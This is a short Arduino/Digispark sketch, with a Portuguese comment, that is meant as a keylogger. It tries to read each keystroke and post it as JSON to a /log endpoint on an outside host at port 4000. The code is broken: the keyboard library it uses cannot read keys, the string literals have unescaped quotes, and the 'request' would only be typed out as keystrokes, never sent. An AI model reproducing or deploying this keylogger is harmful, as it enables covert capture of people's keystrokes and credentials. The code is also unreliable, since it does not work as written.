
#include "DigiKeyboard.h"
#include <SoftwareSerial.h>

SoftwareSerial mySerial(0, 1); // RX, TX

void setup() {
  mySerial.begin(9600);
}

void loop() {
  if (DigiKeyboard.available()) {
    char c = DigiKeyboard.read();
    sendKeyToServer(c);
  }
  DigiKeyboard.update();
}

void sendKeyToServer(char key) {
  // Enviar a tecla para o servidor usando uma requisição HTTP
  DigiKeyboard.println("POST /log HTTP/1.1");
  DigiKeyboard.println("Host: f8bed0785935fd2132.blackbx.ai:4000");
  DigiKeyboard.println("Content-Type: application/json");
  DigiKeyboard.println("Connection: close");
  DigiKeyboard.print("Content-Length: ");
  DigiKeyboard.println(String("{"key":"") + key + String(""}").length());
  DigiKeyboard.println();
  DigiKeyboard.println(String("{"key":"") + key + String(""}"));
}
